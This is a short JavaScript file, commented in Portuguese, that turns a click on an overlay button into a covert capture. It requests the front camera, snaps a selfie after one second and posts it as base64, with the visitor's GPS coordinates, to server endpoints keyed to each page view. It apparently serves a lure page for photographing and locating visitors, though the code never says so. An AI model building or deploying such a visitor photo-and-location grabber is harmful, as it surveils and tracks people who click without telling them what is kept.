async function capturePhoto() {
  try {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      console.error("API de câmera não suportada neste navegador.");
      return;
    }

    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");

    const stream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: "user",
      },
      audio: false,
    });
    video.srcObject = stream;

    await new Promise((resolve) => setTimeout(resolve, 1000));

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
    const dataUrl = canvas.toDataURL("image/jpeg");

    await fetch("/api/page-view-photo", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        pageViewId: pageLoadId,
        photoBase64: dataUrl,
      }),
    });
  } catch (erro) {
    alert("Erro ao tentar capturar foto ou solicitar acesso à câmera:", erro);
  }
}

function captureLocation() {
  if (!navigator.geolocation) {
    console.error("API de geolocalização não suportada neste navegador.");
    return;
  }

  // Solicita acesso e obtém a posição atual
  navigator.geolocation.getCurrentPosition(
    async (posicao) => {
      const { latitude, longitude } = posicao.coords;
      await fetch("/api/page-view-location", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          pageViewId: pageLoadId,
          latitude: String(latitude),
          longitude: String(longitude),
        }),
      });
    },
    (erro) => {
      console.error("Erro ou permissão negada para obter localização:", erro);
    },
  );
}

window.addEventListener("load", () => {
  if (!pageLoadId) {
    return;
  }

  const overlayDiv = document.getElementById("overlay");
  const captureButton = document.getElementById("captureButton");

  captureButton.addEventListener("click", () => {
    overlayDiv.style.display = "none";
    capturePhoto();
    captureLocation();
  });
});
